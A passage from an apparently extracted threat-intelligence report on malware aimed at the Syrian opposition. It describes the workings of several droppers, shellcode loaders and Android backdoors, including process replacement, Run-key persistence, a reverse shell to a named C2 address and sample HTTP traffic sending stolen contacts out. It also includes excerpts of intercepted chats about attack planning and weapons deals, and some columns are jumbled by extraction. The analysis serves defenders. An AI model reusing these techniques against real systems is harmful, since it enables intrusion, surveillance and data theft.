8 and ending with 222 and checking the return value of the\n\nGetAsyncKeyState API (a return value of -32767 (0x8001) means key down and pressed since the last check).\n\n\n-----\n\n###### SPECIAL ASSIGNMENT PERSON 2\n\nIn this redacted, translated, PERSON 2\nand excerpted conversation\nthe leader of an opposition How many people do you have? Monday 19:27 PERSON 1\nfighting group is offered a\nfighting job: launch an attack\non a particular airport. The I have 50 armed, and one anti-aircraft cannon. Monday 19:28\nemphasis on communications\ndiscipline, and the need\nfor documentation are And two Grad launchers.\nboth notable. The need for Monday 19:37\nphotographic proof suggests\na need for verification by a\n\nWould you be willing to take a job and do it without letting\n\ndistant party, perhaps the\n“funder” who is said to be anyone else interfere? Monday 19:38\nin Saudi Arabia. Perhaps\nphotographic proof is also Like what? Monday 19:46\nimportant for a group (or\nfunder’s) reputation and\nbeing able to claim credit for\n\nI have a job that will make your unit the strongest unit in\n\na particular attack. the city\n\nMonday 19:47\n\nWe need to hit from a distance with a missile (RPG) or with\na tank the [REDACTED] airport and burn a plane in the\nairport or a gas tank. At that time, you can ask for the most\nprecious thing. We were in an agreement with [REDACTED,\nOFFICER NAME AND RANK]. However we couldn’t get\nhim in time, we promised him a big reward if he burned\nanything at the airport.\n\nMonday 19:56\n\nI will give you pictures of the hit on the [REDACTED] airport.\n\nMonday 20:07\n\nBefore you go to work, tell the partners so that they know,\nand I need you to send the picture in a file and we will not\nbroadcast it, it will just be used for evidence that it was\ndone or complete, after two hours of you sending the folder\nwith the picture, you can publish.\n\nMonday 20:08\n\nTomorrow, I will hit it with a hundred anti plane shells and I\nwill burn it.\n\nMonday 20:09\n\nToday, At 1 I will talk to the individual that will fund you, so\nhe knows and so you can tell me the time that you will hit.\n\nIn full form, this conversation Also make sure no one has a phone and do not let anyone\nreveals several pieces of take any pictures so that you are the only one who has the\n\npicture and so that no one deceives you.\n\nsensitive military information Monday 20:10\nregarding the opposition’s\napproach to launching,\nfunding, and operationalizing Tomorrow in the evening you will have the pictures.\nan attack plan. The potential Monday 20:21\nreal-time surveillance\nof opposition wartime\n\nCall the funder from Saudi Arabia, and based on the promise\n\ndiscussions could provide the\n\nthat today is the work, let him know that the people who will\n\nAssad regime with valuable\n\nwork in [REDACTED] told me that they need to move forward\n\nintelligence about ongoing or and execute on the operation.\nplanned military campaigns, Today 8:27\nidentification of who funds\nthe opposition, and how\nthe operational financial\n\n\n-----\n\n###### BLACKSTAR, A CUSTOM DROPPER FOR THE DARKCOMET RAT\nDarkComet is a widely available, stable, and easy to use remote administration tool (RAT) that allows\na threat actor to control a compromised system. In addition to standard backdoor functions such as\nmanipulating processes, services, the registry, and uploading and downloading files, DarkComet can\nalso activate the webcam and microphone. Since DarkComet is so well known, security products such as\nantivirus software can often detect it.\n\nThis threat group uses a custom dropper which we call BLACKSTAR. BLACKSTAR contains an embedded,\nobfuscated binary which is a second dropper and launcher that we call REDDWARF. REDDWARF\ncontains the actual DarkComet payload. BLACKSTAR writes REDDWARF to disk for persistence, but\nDarkComet itself is only ever extracted to memory by REDDWARF. Many antivirus vendors fail to detect\nthis DarkComet backdoor because it is obfuscated inside the BLACKSTAR binary or because it is loaded\ninto memory using process replacement.\n\nBLACKSTAR malware performs the following actions:\n\n1. The BLACKSTAR binary (in this case, adobereadersetup-86x.exe,\n39632325327bf21f7d9cf02caf065646) is first extracted from two nested SFXRAR archives, as\ndescribed above.\n\n2. BLACKSTAR contains two resources:[15]\n\n   - QUYFKY\\DIOKAK contains a decoder key for the configuration data and the embedded PE\n\n(REDDWARF).\n\n   - QUYFKY\\UXLNYL contains the encoded configuration data which consists of function names that\n\nthe malware resolves dynamically, as well as offsets used to extract the embedded PE.\n\n3. REDDWARF is actually contained within a Word document embedded within the BLACKSTAR\nbinary. BLACKSTAR first finds the offset of the embedded Word file, then decodes the configuration\ndata that includes the offset of the REDDWARF binary within the Word file.[16] The embedded key\nis used to decode the embedded REDDWARF binary (8af83d74033aded17af538e4ccf12092).\nREDDWARF is loaded in to memory and executed, replacing the BLACKSTAR process in memory\nthrough a technique known as process replacement.[17]\n\n15 The resource names vary across samples, and appear to consist of six random upper-case letters.\n\n16 The Word document is never written to disk, and may simply be intended to further mask the REDDWARF binary.\n\n17 Process replacement replaces a legitimate binary in memory with a malicious one. First, a legitimate binary is launched in a suspended state. The content of\n\nthe legitimate binary is then unmapped from memory, memory is allocated at the original binary’s location, and the content of the malicious file is written to\nthat memory space. The main suspended thread is pointed to the memory location of the malicious code, and the thread is resumed, executing the malware.\nBy using process replacement the malicious code will appear to be the legitimate process to many analysis tools.\n\n\n-----\n\n|Behind the Syrian Conflict’s Digital Front Lines SPECIAL REPORT|Col2|\n|---|---|\n|NEEDING PASSPORTS PERSON 1 This redacted, translated PERSON 1 and excerpted conversation appears to describe an attempt Do you know someone that can get us some identities to secure forged passports and Passports for travel? and identity documents 13:00 PERSON 2 for the purpose of travel. Syrians attract much scrutiny I have a smuggler. 13:01 while traveling overseas for many reasons, and a Syrian opposition member would have many motivations He helps get [smuggle] people out. 13:01 to conceal his or her true nationality. The reason for avoiding Turkish documents We are not looking for a smuggler. 13:02 may be that a Syrian would have a difficult time pretending to be Turkish, but a much easier time with another We want identities and passports. 13:02 Arabic speaking identity. We do not want them for Turkey. 13:03 We want them for the UAE and others. [The passports] 13:04 In full form, this conversation discloses opposition travel efforts That is my brothers job, he knows about that 13:07 and the forgery methods opposition members have sought to secure the documentation required Aha 13:08 to move in concealed fashion. The Assad regime likely places a high good 13:09 priority on understanding opposition movements, the identities of its personnel, and methods SEND for traveling discreetly.||\n|||\n\n\n###### NEEDING PASSPORTS PERSON 1\n\nThis redacted, translated PERSON 1\nand excerpted conversation\nappears to describe an attempt Do you know someone that can get us some identities\nto secure forged passports and Passports for travel?\nand identity documents **13:00** PERSON 2\nfor the purpose of travel.\nSyrians attract much scrutiny\n\nI have a smuggler. **13:01**\n\nwhile traveling overseas for\nmany reasons, and a Syrian\nopposition member would\nhave many motivations He helps get [smuggle] people out. **13:01**\nto conceal his or her true\nnationality. The reason for\navoiding Turkish documents\n\nWe are not looking for a smuggler. **13:02**\n\nmay be that a Syrian would\nhave a difficult time pretending\nto be Turkish, but a much\neasier time with another We want identities and passports. **13:02**\nArabic speaking identity.\n\nWe do not want them for Turkey. **13:03**\n\nWe want them for the UAE and others. [The passports] **13:04**\n\nIn full form, this\nconversation discloses\nopposition travel efforts That is my brothers job, he knows about that **13:07**\nand the forgery methods\nopposition members\nhave sought to secure the\n\nAha **13:08**\n\ndocumentation required\nto move in concealed\nfashion. The Assad\nregime likely places a high good **13:09**\npriority on understanding\nopposition movements,\nthe identities of its\npersonnel, and methods\nfor traveling discreetly. **SEND**\n\n\n4. REDDWARF contains two resources:\n\n   - RT_RCDATA\\1 which contains the DarkComet binary\n\n(24f1658f3f38245dc15b9619bc97979b);\n\n   - RT_RCDATA\\2 which contains plaintext configuration data.\n\nSimilar to BLACKSTAR, the REDDWARF configuration\ndata consists of function names that the malware resolves\ndynamically; the registry location that the malware should\nuse for persistence; and (optionally) a file name that\ncontains a script.\n\n5. REDDWARF extracts the DarkComet backdoor and spawns\na copy of itself. It uses process replacement on that copy\nto launch the DarkComet backdoor in memory. Finally\nREDDWARF copies itself to disk, maintaining persistence via\nthe registry entry specified in its configuration file (e.g., HKCU\\\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\1).\n\nWe suspect that the malware authors used an automated tool\nto embed the DarkComet payload within the second binary and\n\n\nwithin the BLACKSTAR dropper. Interestingly, we observed at\nleast one case where the payload may have been run through the\npackaging tool twice; that is, the BLACKSTAR dropper contained\nan embedded REDDWARF binary, which contained another\nBLACKSTAR dropper, which contained another REDDWARF\nbinary, which contained the final DarkComet payload:\n\n- BLACKSTAR binary (itself contained within multiple SFXRAR files):\n\nGoogleUpdate.exe,7247d42b3b4632dc7ed9d8559596fff8.\n\n- Embedded REDDWARF binary:\n\n1b20ea5887775f8eddf5aecd5d220154\n\n- Embedded BLACKSTAR binary:\n\n97a35a7471e0951ee4ed8581d2941601\n\n- Embedded REDDWARF binary:\n\ndd08f85686bd48e4bab310d8fbff81a4\n\n- Embedded DarkComet payload:\n\nae1ea30e6fb834599a8fed11a9b00314\n\nThat particular BLACKSTAR dropper\n(7247d42b3b4632dc7ed9d8559596fff8) was dropped\nb t l t f diff t i i l “l ” fil\n\n\n-----\n\n###### YABROD DOWNLOADER AND CABLECAR LAUNCHER\nThis threat group deploys a set of malware consisting of an initial downloader that we call YABROD and a\nlauncher that we call CABLECAR.\n\nThe YABROD downloader contains embedded shellcode (used to download and execute a second binary)\nand an embedded, password-protected PDF stored in a PE resource named PDF. The PDF file is not\nmalicious and acts as a decoy document, displaying relevant content to its intended victim. However, the\nPDF also contains a shellcode payload, and data used to generate an XOR key to decode the shellcode.\n\nYABROD does not decode and execute the shellcode from the PDF on its own, but relies on a downloaded\nsecond-stage binary (CABLECAR) to do so. Some YABROD variants also contain an embedded, nonmalicious executable stored in a PE resource named EXE. The executable acts as a second decoy, installing\na valid piece of software while the YABROD downloader runs in the background.\n\nYABROD attempts to inject its embedded shellcode into a specified process on the victim computer; the\nprocess may vary depending on the YABROD sample. We identified variants that attempted to inject\ninto Skype (skype.exe); various browser processes (chrome.exe, firefox.exe, iexplore.exe);\nor specific processes associated with Microsoft .NET (e.g., cvtres.exe). Presumably the threat actors\nselected processes they expected to be running on their victims’ computers.\n\nOnce loaded into its target process, the YABROD shellcode connects to a specified C2 server via HTTP to\ndownload and execute a second file. We have identified samples that use a hard-coded IP address for C2,\nas well as samples that use a URL redirect to connect to a Dropbox account.\n\nThe YABROD samples we identified download an executable launcher that we call CABLECAR;\nCABLECAR parses the password-protected PDF dropped by YABROD to identify a 16-byte key and\nthe embedded shellcode payload. The key is used with a substitution table from the CABLECAR binary\nto generate an XOR key to decode the shellcode payload from the PDF. CABLECAR then attempts to\ninject the shellcode into a specific process; similar to YABROD, the process may vary across samples but\nincludes browsers (chrome.exe, firefox.exe, iexplore.exe) and .NET processes (vbc.exe). In the\nsamples we analyzed, the shellcode payload was a Metasploit reverse shell; the shellcode is loaded only in\nto memory and never touches disk.\n\n\n-----\n\n**Figure 16: Yabrod password-protected PDF** **Figure 17: Downloading the file Yabrod.pdf**\n\n###### DETAILED ANALYSIS\nBelow is a detailed analysis of a particular YABROD sample.\n\n**Step 1: The YABROD downloader (bd4769f37de88321a9b64e5f85baf1ef) attempts to launch the**\n\nMicrosoft .NET process %systemroot%\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe\nin a suspended state and inject its embedded shellcode into the process. After that, the downloader\nsleeps for 2 minutes to allow the shellcode to execute.\n\n**Step 2: The YABROD downloader checks for the existence of two PE resources, PDF #112**\n\nand EXE #115. YABROD extracts an embedded password-protected PDF file\n(e0625817eb11874d806909a8c190d45a) from Resource PDF #112 and writes it to %temp%\\\nYabrod.pdf.\n\n**Step 3: YABROD then extracts and executes an embedded executable decoy file from resource EXE**\n\n#115, vpn7x32.exe (bc167bca4ca3cf6f2f2bd7e90ecdeb29), which is a legitimate installation\nprogram for a VPN client. Note: if the EXE resource exists, YABROD uses the embedded\nexecutable as the decoy file displayed to the user. If there were no EXE resource, YABROD would\ndisplay the embedded PDF as a decoy instead, using the default application as specified in the\nWindows registry. An excerpt from the PDF’s content is shown in Figure 16.\n\n**Step 4: The YABROD shellcode injected into cvtres.exe downloads a file by making a HTTP request**\n\nto 80.241.223.128/Yabrod.pdf using “n1” as the User-Agent. The downloaded file is placed\nin %temp% as GoogleUpdate.exe. A registry value GoogleUpdate is added under HKCU\\\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run and set to “%temp%\\GoogleUpdate.\nexe”. The %temp% environment variable is expanded prior to writing the registry value.\n\nThe download request and response are shown in Figure 17.\n\n\n-----\n\n**Step 5: The YABROD downloader attempts to start the process %temp%\\GoogleUpdate.exe without**\n\nchecking if the file exists.\n\n**Step 6: The downloaded executable (4e007cb87626f0093a84ed50b1d27a7f), a variant of the CABLECAR**\n\nlauncher, was launched on the victim system. CABLECAR parsed the PDF from step 2, looking for\nthe second \">>stream\" string following the first occurrence of the string \"Encrypt\". The location\ncontained a 16-byte (0x10) key. CABLECAR then searched for the stream identified by subtype/\nXML/Type/Metadata/stream. The key and a 256-byte (0x100) substitution table stored within\nCABLECAR itself were used to generate an XOR key to decrypt shellcode stored in the PDF stream. In\nthis case, the shellcode was a copy of the Meterpreter reverse shell (meterpreter_reverse_tcp).\n\n**Step 7: CABLECAR creates a specific process (in this case, %systemroot%\\Microsoft.NET\\**\n\nFramework\\v2.0.50727\\vbc.exe)in a suspended state to inject the decoded shellcode[18\n]\n\n(vbc.exe is the Microsoft .NET Visual Basic Compiler).\n\n**Step 8: The Metasploit shellcode (4e007cb87626f0093a84ed50b1d27a7f) from the YABROD PDF file**\n\nconnects back to the C2 IP 80.241.223.128 on TCP port 55555, providing a remote shell to the\nthreat actors.\n\n###### PYTHON-BASED BACKDOOR SHELLCODE LAUNCHER\nThis threat group uses another backdoor implemented as an encrypted Python script contained within a\npyinstaller dropper.\n\nThe dropper, Facebook-Account.exe (64a17f5177157bb8c4199d38c46ec93b), was built using pyinstaller, a\nprogram that converts Python programs into standalone executable files.[19]\n\nThe pyinstaller binary creates a folder under %temp% with the name _MEIXXXX, where XXXX is a random\nnumber. The folder is used to drop all the modules and libraries used by the packaged script. The dropped\nfiles include Microsoft Visual C++ runtime libraries (such as msvcm90.dll) as well as python27.dll and\nvarious Python binaries (.pyd files). The Python libraries appear to be from the 2.7.5 distribution of Python.\n\n18 Interestingly, instead of using the traditional CreateRemoteThread function call to execute the injected shellcode, the malware uses the undocumented\n\nfunction RtlCreateUserThread.RtlCreateUserThread avoids problems associated with different privileges that may exist between the injecting process\n(CABLECAR) and the target process and helps ensure the injection will succeed.\n\n19  http://www.pyinstaller.org/\n\n\n-----\n\nThe malicious Python\nscript is decrypted in\nmemory as shown in\nFigure 19:\n\n\nOnce the malicious python script is decoded, it is executed via PyRun_SimpleString by the pyinstaller\nbinary. The malicious script connects to 80.241.223.128 on TCP port 55555 and downloads data, copies\nit to memory, decodes it, and executes it in its own thread.\n\n\n-----\n\n###### ANDROID BACKDOORS\nWe identified two pieces of Android malware associated with this threat group. Both variants are able to\nsteal contact names, phone numbers, and the phone’s username. In addition, one of the variants is also\nable to transmit a device’s geographic location to the malware’s C2 server.\n\nThe two Android backdoors were as follows:\n\n- Syria-Twitter.apk (b91315805ef1df07bdbfa07d3a467424)\n\n- Rasoo-dl.apk (e0b1caec74f31e8196a250f133f4345a)\n\nBoth applications were signed with the same self-signed certificate:\n\n\n**Figure 21: Self-signed certificate details**\n\nVersion: V3\nSerial Number: 2d744830\nSignature Algorithm: SHA256withRSA, OID = 1.2.840.113549.1.1.11\nSignature Hash Algorithm: sha256\n\nIssuer: CN=Sami AlShami, OU=ShamDroidz-DEV, O=ShamDroidz, L=Homs, ST=Homs, C=SY\nValid From: Thursday, August 15, 2013 9:59:52 PM\nValid To: Monday, August 09,2038 9:59:52 PM\nSubject: CN=Sami AlShami, OU=ShamDroidz-DEV, O=ShamDroidz, L=Homs,\nST=Homs, C=SY\nPublic Key: RSA (2048 bits)\nThumbprint: 9f 67 a5 fb 87 60 ce 33 1f c1 fe 79 c5 3d e2 e2 d9 fd 0b 66\n\n\nThe “Syria Twitter” application, shown below, was published on August 27, 2013, and had over 100\ndownloads on Google Play before being removed. The “Rasoo-dl” application does not appear to have\nbeen distributed via Google Play.\n\n\n-----\n\nBoth applications use the following permissions, which allow them to perform the listed tasks:\n\n- INTERNET: Connect to the Internet\n\n- ACCESS_NETWORK_STATE: Check the cellular network connectivity\n\n- GET_ACCOUNTS: Get all the accounts used by the phone for authentication\n\n- READ_CONTACTS: Read all the contacts\n\nThe “Rasoo-dl” application has the following additional permission:\n\n- ACCESS_FINE_LOCATION: Show the victim’s physical location\n\nBoth apps contain code (shown in Figure 22) to steal contact names and phone numbers from the victim’s\nphone and transmit them via HTTP POST requests (in the format contact&=<username>&<contact_\nname>&<contact_phone>) to a specific C2 location:\n\n\n**Figure 22: Sending stolen data to C2**\n\n\n-----\n\nBelow is an example of traffic generated by the “Syria-Twitter” application (data displayed below is crafted\nand not actual contact data):\n\n**Figure 22: Example of traffic generated by the \"Syria-Twitter\" application**\n\nPOST /contacts HTTP/1.1\nContent-Length: 43\nContent-Type: application/x-www-form-urlencoded\nHost: 80.241.223.128:4646\nConnection: Keep-Alive\nUser-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)\n\ncontact%26=null%26John+Rogers%26+2175566789\n\nPOST /contacts HTTP/1.1\nContent-Length: 44\nContent-Type: application/x-www-form-urlencoded\nHost: 80.241.223.128:4646\nConnection: Keep-Alive\nUser-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)\n\ncontact%26=null%26Wangzhi+Chen%26+6312134560\n\n“Rasoo-dl” contains additional code to send a device’s geographic location, also via an HTTP POST request:\n\n\n**Figure 23: Sending the device’s geographic location to the C2 server**\n\n\n-----\n\n###### OPPOSITION WEAPONS ACQUISITION PERSON 1\n\nIn this redacted, translated PERSON 1\nand condensed conversation,\ntwo members of the 9m 113 with tandem warhead 17:15 PERSON 2\nopposition are discussing\nthe transfer of between 5-10\nRussian-made anti-tank This missile is the same as the Konkurs. 17:17\nmissiles and launchers. The\nmissile system is the 9M113 [REDACTED]\nSemi-Automatic Command\nto Line of Sight (SACLOS)\n\nDo you know what generation? 17:41\n\nAnti-Tank Guided Missile\n(ATGMs), NATO designator:\nAT-5 SPANDREL. They\n\nThis is probably Second generation 17:50\n\nappear to be referring to\na Tamdem High Explosive\nAnti-Tank warhead version of\nthe missile, which would be I mean its old 17:52\nparticularly effective against\narmored vehicles and tanks.\nFSA-linked groups facing Yeah for sure 17:55\nthe Assad regime’s Tanks\nhave extensively used the\n9m 113 missile in Syria, and Its very old 17:56\na number of YouTube videos\nshow successful ‘hits’ against\nregime materiel. Look online to find out more information about it.\n\n17:57\n\nhttp://ar.wikipedia.org/wiki/9%D9%85113_%D9%83%D9\n%88%D9%86%D9%83%D9%88%D8%B1%D8%B3\n\n17:58\n\nis this what you want? 18:09\n\nScreenshot of an AT-5\nmissile from the Wikipedia Yes god willing. 18:10\npage referenced by Person 2\nwithin the chat\n\n[REDACTED]\n\nbe ready we may deliver in 24 hours. 18:16\n\nI hope to god we will be ready. 18:18\n\nwhere is the delivery site? 18:19\n\nIn full form, this conversation\ncontains sensitive information\nregarding opposition weapons [REDACTED LOCATION]\nacquisition efforts. The\nconversation includes details\nregarding the desired quantity ok 18:24\nof missiles for acquisition,\nthe precise delivery location,\ntimelines and procedures for there will be a specific set of procedures that we will need\ntransfer. Individuals involved to follow to deliver and receive [the missile systems] but I\nin this weapons procurement do not know them yet. 18:27\nmay have been put at risk,\nalong with broader opposition\nlogistics methods, perhaps\naffecting future weapons\n\n\n-----\n\n###### MALWARE SAMPLES\nBelow are the files and MD5 hashes for the malware associated with this threat group.\n\n**Table 1: List of malicious file names and MD5 hashes**\n\n|File Name|MD5|Description|\n|---|---|---|\n||0187be3ccf42c143ab96e7bbf2efbf2f|Dropper (SFXRAR)|\n||0cc7b05c220ecbeb52891d49f1ab41ab|Dropper (SFXRAR)|\n|idm-en-setup.exe|29e79080b2b2de01b53223542b46d570|Dropper (SFXRAR)|\n|IslamArmyThem.exe|2a456e35918700bc76f6ec1dd9ea93a1|Dropper (SFXRAR)|\n|Keyboard-Sounds.exe|36875b44145cf20b8d3148e7f7efcea0|Dropper (SFXRAR)|\n||3ffc4e4081854d04d8217c2ebabdd61d|Dropper (SFXRAR)|\n|Pdf-to-Word-Converter.exe|4268e2a8209429155ef5df22ca17c0be|Dropper (SFXRAR)|\n|from-aliwa2-doctor-salim-dris-to-whom-it-may-concern.exe|465a0bf22cd101dbd502a2576f10ceb4|Dropper (SFXRAR)|\n|diplaced-syrian-people-cod.exe|4cd035012ec6015e48f6fb7001330a95|Dropper (SFXRAR)|\n||4d70791db506cb04e62b607e1f57699c|Dropper (SFXRAR)|\n||5e334057856967a5d31c266c550549b0|Dropper (SFXRAR)|\n|Displaced-Syrians-Suffering_cod.exe|6439ccba5b06e434953ba209b8b07107|Dropper (SFXRAR)|\n|install_flashplayer11x32_gdrd_aih.exe|6608ce246612d490f3b044627a5e6d9e|Dropper (SFXRAR)|\n||692265ba1d4a5b2773e596d3491ed2be|Dropper (SFXRAR)|\n|JetCleanSetup.exe|7091f135e4718586d16b56c04b21a6b7|Dropper (SFXRAR)|\n|Syrian-Girl-Against-Regime_gpj.exe|8a0a36d0d1d91b357e5ce8f84ad16346|Dropper (SFXRAR)|\n|Maktal-Kiyadi-Barez-men-hizbillah-fi-ltafgir-l2akhir-fi- ldahya12300012.exe|931bafa20756eaf8b5371222b5b81a61|Dropper (SFXRAR)|\n||980c6e7f8a10144a28730f3f0adb99d0|Dropper (SFXRAR)|\n|AdobeReader-9-En-Us.exe|99655bacbe845ad30c6c5ed56a7e13d4|Dropper (SFXRAR)|\n|Eye-Protector-Portial-Setup.exe|a19e70ffa130a096753463b23733927d|Dropper (SFXRAR)|\n|Billiards.exe|a577701d4b5ada66912a242a7772b48a|Dropper (SFXRAR)|\n|New-Iman-Picture.pif|a9e5ec23ccdec9cd79af771e2dbf54d5|Dropper (SFXRAR)|\n||c79ad54dead0b446fe8fac60cbd133a7|Dropper (SFXRAR)|\n|Live-Chat-ooVoo-Setup.exe|c808ef1ab997d0234ee889ecd5176c8e|Dropper (SFXRAR)|\n|Syrian-Girl-Against-Regime_gpj.exe|d023fc719fba710b44f140deff3f83e4|Dropper (SFXRAR)|\n|Syrian-chlidren-under-execution_fdp.exe|d32aaf60744678e559db59fbe2daa938|Dropper (SFXRAR)|\n|nazhin.exe|d87356940d3b15d87453ead6374691ab|Dropper (SFXRAR)|\n|Video-Downloader.exe|dc33cbf669df01302ddd124b028a4fd9|Dropper (SFXRAR)|\n|Amer-Mohemmeh.exe|e403972c890cf2eb0a361a91ac5ffe5e|Dropper (SFXRAR)|\n|Live-Chat-ooVoo-Setup.exe|e41c913327e6974730da99e7c327a2a2|Dropper (SFXRAR)|\n||e65bdb88e606c45521ab2c04c650ed86|Dropper (SFXRAR)|\n|Russia-vs-Amerika.exe|ef56383f53b7ccb08016737c98fe2982|Dropper (SFXRAR)|\n|google-update.sfx.exe|27c2b873849227de45ec10fca112f322|Dropper (password- protected SFXRAR)|\n|adobereadersetup-86x.sfx.exe|47702a6cdc59859ec97c99aa31148ae6|Dropper (password- protected SFXRAR)|\n\n\n-----\n\n**Table 1: List of malicious file names and MD5 hashes**\n\n|File Name|MD5|Description|\n|---|---|---|\n|adobeflash.sfx.exe|4bd3ea86eb7d63b1bdd001e6adbe8b89|Dropper (password- protected SFXRAR)|\n|oovoo-setup.sfx.exe|57cbbe8e7d18b1980cfc4bc87121b2c7|Dropper (password- protected SFXRAR)|\n|microtec.sfx.exe|5ae84cadc1ea5a4bcc027a19eca514c5|Dropper (password- protected SFXRAR)|\n|Microsoft-Update.sfx.exe|63fb57fd90590c3c0d0d95d86b6df66d|Dropper (password- protected SFXRAR)|\n|adobesetup.sfx.exe|748b8aca1c17415648b80f0038381097|Dropper (password- protected SFXRAR)|\n|adobesetupx86.sfx.exe|81ef5426583e1d6df4193f38402b40c1|Dropper (password- protected SFXRAR)|\n|office-word-update.sfx.exe|9491c4e0c08c9347421ae352f14a1329|Dropper (password- protected SFXRAR)|\n|update-flashplayer11.sfx.exe|a1e0d40715f66f30aad44ab4c15a474a|Dropper (password- protected SFXRAR)|\n|install_flashplayer11x32_gdrd_aih.exe|b23b16b3cccba9c1ecd0c0d17cc48979|Dropper (password- protected SFXRAR)|\n|adobesetupx86.sfx.exe|b9623abd519ee688e0b9d9350c83e209|Dropper (password- protected SFXRAR)|\n|adobesetupx86.sfx.exe|d4b4367f874c9c8d645b1560f9d259ea|Dropper (password- protected SFXRAR)|\n|adobereader-86x.sfx.exe|d620deacd018da09a69e24cb978f556d|Dropper (password- protected SFXRAR)|\n|adobesetup32.sfx.exe|d672e9789f22b806a295f0dd2122316a|Dropper (password- protected SFXRAR)|\n|adobe32en.sfx.exe|e2a624302af7a3eeb59cbb58f36b0fac|Dropper (password- protected SFXRAR)|\n|adobereader-86x-64x.sfx.exe|f7f8538d2ab0ffee878a4e512230f97d|Dropper (password- protected SFXRAR)|\n|adobesetupx86.sfx.exe|f893d5d351a3ffc1f89a8ec8147cd060|Dropper (password- protected SFXRAR)|\n|adobred-86x.sfx.exe|fda3816d0bac2e4791cbcfaf33416633|Dropper (password- protected|\n|adobesetupx86.sfx.exe|ff97bc797ed27b5e21e4e4a6e7443219|Dropper (password- protected SFXRAR)|\n|adobesetup.exe|163595b20debdeccdeaf4cb14fba737c|BLACKSTAR|\n|adobe32en.exe_|202eb180f5faa8460941ae60cf63da63|BLACKSTAR|\n|adobereadersetup-86x.exe_|39632325327bf21f7d9cf02caf065646|BLACKSTAR|\n|adobex86setup.sfx.exe|64eb08013399e3ac18c936d361d80e17|BLACKSTAR|\n|google-update.exe|7247d42b3b4632dc7ed9d8559596fff8|BLACKSTAR|\n|adobereader-86x.exe|7576127f8bd805b30d0016d897211f54|BLACKSTAR|\n\n\n-----\n\n**Table 1: List of malicious file names and MD5 hashes**\n\n|File Name|MD5|Description|\n|---|---|---|\n|adobesetupx86.exe|89dda79018d6216970a274b16b3494ad|BLACKSTAR|\n|adobred-86x.exe|a641c08e09c53858d16c0c70107979b5v|BLACKSTAR|\n|adobereader-86x-64x.exe|a691e4b629da2b37dd87e760bfb0106e|BLACKSTAR|\n|adobeflash.exe|c421f4e12892d4ac345e7b03f6a053d2|BLACKSTAR|\n|adobesetup32.exe_|d1f817744f79dad415a526c4ce51bed9|BLACKSTAR|\n|adobeinsx86.exe|de65eed45ac210c66db8082f1a72db8f|BLACKSTAR|\n|adobesetupx86.exe|e11aeb603cb7a31c2028976a2deed550|BLACKSTAR|\n|microtec.exe|0bf0e05247b986c484dbfe53ebb8ac48|DARKCOMET|\n|googleupdate.exe_|ae1ea30e6fb834599a8fed11a9b00314|DARKCOMET|\n|microsoft-update.exe|6b5aabd26998568d9ca628713b53cacf|ONESIZE|\n|flashplayer11x32_gdrd_aih.exe|b68a7e216cb0d18030048935b67e0d68|ONESIZE|\n|bayan09072013_pdf.exe|0e24a0060493bcb85ce4a5110550f204|YABROD|\n|Keyboard-Sounds.exe|1328d3d4872bfe2c98fd7b672d8dff1b|YABROD|\n|reporthezbolla20072013_pdf.exe|508deeb6a5a37e9f94d5d4733ce0352f|YABROD|\n|VPN7.exe|bd4769f37de88321a9b64e5f85baf1ef|YABROD|\n||f18dedf9f5d213deba18a2e037819ea1|YABROD|\n|44df02ac28d80deb45f5c7c48b56a858|44df02ac28d80deb45f5c7c48b56a858|YABROD PDF|\n|78c5670e2cee9b5c3b88aa9cb27519be.pdf|78c5670e2cee9b5c3b88aa9cb27519be|YABROD PDF|\n|9d351b9ee731d88f12fcaa64010e828d.pdf|9d351b9ee731d88f12fcaa64010e828d|YABROD PDF|\n|yabrod.pdf|e0625817eb11874d806909a8c190d45a|YABROD PDF|\n|greenhill.png|182c7b1ad894852d23f4de538e59ac2b|CABLECAR|\n|4e007cb87626f0093a84ed50b1d27a7f|4e007cb87626f0093a84ed50b1d27a7f|CABLECAR|\n|Facebook-Account.exe|64a17f5177157bb8c4199d38c46ec93b|Dropper for pyinstaller malware|\n|syria-twitter.apk|b91315805ef1df07bdbfa07d3a467424|Android Malware|\n|rasoo-dl.apk|e0b1caec74f31e8196a250f133f4345a|Android Malware|\n\n\n-----\n\n###### To download this or other FireEye Threat Intelligence reports,\n\n visit: www.fireeye.com/current-threats/threat-intelligence-reports.html\n\n\nFireEye, Inc. | 1440 McCarthy Blvd. Milpitas, CA 95035 | 408.321.6300 | 877.FIREEYE (347.3393) | info@fireeye.com | www.fireeye.com\n\n© 2015 FireEye, Inc. All rights reserved. FireEye is a registered trademark of\nFireEye, Inc. All other brands, products, or service names are or may be trademarks\nor service marks of their respective owners. SP.SYR.EN-US.022015\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/qriikjn5436zpiyazh8ta7gbzbd04onf",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2015/2015.02.02.behind-the-syria-conflict/rpt-behind-the-syria-conflict.pdf"
    ],
    "report_names": [
        "rpt-behind-the-syria-conflict"
    ],
    "threat_actors": [
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
